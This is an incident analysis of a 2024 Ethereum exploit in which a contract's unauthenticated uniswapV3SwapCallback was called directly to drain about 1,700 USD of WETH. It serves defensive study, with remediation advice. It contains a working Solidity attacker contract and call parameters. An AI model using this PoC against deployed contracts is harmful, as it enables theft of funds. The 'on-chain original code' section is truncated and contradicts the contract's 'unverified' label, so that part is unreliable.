# Unverified 0x03f9 — uniswapV3SwapCallback Unverified Callback Vulnerability Analysis

| Field | Details |
|------|------|
| **Date** | 2024-09-06 |
| **Protocol** | Unverified Contract 0x03f9 |
| **Chain** | Ethereum |
| **Loss** | ~1,700 USD |
| **Attacker** | [0xf073a21f](https://etherscan.io/address/0xf073a21f0d68adacfff34d5b8df04550c944e348) |
| **Attack Tx** | [0x1a3e9eb5](https://etherscan.io/tx/0x1a3e9eb5e00f39e84f90ca23bd851aa194b1e7a90003e3f6b9b17bbb66dabbb9) |
| **Vulnerable Contract** | [0x03f911ae](https://etherscan.io/address/0x03f911aedc25c770e701b8f563e8102cfacd62c0) |
| **Root Cause** | No msg.sender validation in uniswapV3SwapCallback — WETH drained via direct call |
| **PoC Source** | [DeFiHackLabs](https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2024-09/unverified_03f9_exp.sol) |

---
## 1. Vulnerability Overview

The 0x03f9 contract implements the Uniswap V3 swap callback function (`uniswapV3SwapCallback`), but does not verify whether the caller is an actual Uniswap V3 pool. The attacker, holding WETH in advance, directly called the callback function to trick the contract into transferring its WETH balance to the attacker.

## 2. Vulnerable Code Analysis

```solidity
// ❌ uniswapV3SwapCallback: no msg.sender validation
contract Vulnerable0x03f9 {
    function uniswapV3SwapCallback(
        int256 amount0Delta,
        int256 amount1Delta,
        bytes calldata data
    ) external {
        // ❌ No check that msg.sender is an actual UniswapV3 pool
        // ❌ No validation of token, recipient within data
        (address token, address recipient, uint256 fee) = abi.decode(data, (address, address, uint256));
        IERC20(token).transfer(recipient, uint256(amount0Delta));
    }
}

// ✅ Fix:
// address pool = IUniswapV3Factory(factory).getPool(token0, token1, fee);
// require(msg.sender == pool, "not authorized pool");
```

### On-chain Original Code

Source: Sourcify verified

```solidity
// File: Unverified03f9_decompiled.sol
contract Unverified03f9 {
    function swap(address p0, bool p1, int256 p2, uint160 p3, bytes memory p4) external {}  // ❌ vulnerability
```

## 3. Attack Flow

```
Attacker
  │
  ├─[1]─▶ Deploy AttackerC
  │         Holds 737035470365687849 WETH
  │
  ├─[2]─▶ Craft malicious data
  │         abi.encode(weth9, address(AttackerC), 10000)
  │
  ├─[3]─▶ Direct callback invocation:
  │         vul_contract.uniswapV3SwapCallback(
  │             737035470365687848,   // amount0Delta (positive = payment)
  │             -18035979692517947,   // amount1Delta (negative = receipt)
  │             data
  │         )
  │         └─ ❌ No msg.sender validation → WETH transferred to AttackerC
  │
  ├─[4]─▶ Check WETH balance then unwrap
  │
  └─[5]─▶ Transfer ETH to attacker → ~1,700 USD drained
```

## 4. PoC Code

```solidity
contract AttackerC {
    receive() external payable {}

    function attack() public {
        // ❌ Drain WETH by calling the callback directly
        bytes memory data = abi.encode(
            address(weth9),
            address(this),
            uint256(10000)
        );
        (bool ok, ) = vul_contract.call(
            abi.encodeWithSelector(
                bytes4(keccak256("uniswapV3SwapCallback(int256,int256,bytes)")),
                int256(737035470365687848),   // amount0Delta
                int256(-18035979692517947),   // amount1Delta
                data
            )
        );
        require(ok, "callback failed");

        // Withdraw WETH balance
        uint256 bal = IWETH9(weth9).balanceOf(address(this));
        IWETH9(weth9).withdraw(bal - 1);
        payable(msg.sender).transfer(address(this).balance);
    }

    fallback() external payable {}
}
```

## 5. Vulnerability Classification

| Category | Details |
|------|-----------|
| **Vulnerability Type** | Missing Callback Authentication |
| **Attack Vector** | Direct invocation of uniswapV3SwapCallback |
| **CWE** | CWE-284: Improper Access Control |
| **DASP** | Access Control Vulnerability |
| **Severity** | High |

## 6. Remediation Recommendations

1. **Pool Address Validation**: Verify that `msg.sender` is a legitimate Uniswap V3 pool via the factory contract
2. **Callback Guard**: Set and check an internal flag (`_inSwap`) before entering the callback
3. **Data Validation**: Whitelist token/recipient addresses decoded from the `data` parameter within the callback
4. **Least Privilege**: Restrict the tokens and amounts the callback is permitted to transfer at the start of the transaction

## 7. Lessons Learned

- Uniswap V3 callbacks (`uniswapV3SwapCallback`, `uniswapV3FlashCallback`) must always verify that the caller is a legitimate pool.
- Failing to validate `msg.sender` in a callback function means anyone can invoke it directly.
- Even for unverified contracts, a publicly known function signature is sufficient for an attacker to identify and exploit a vulnerability.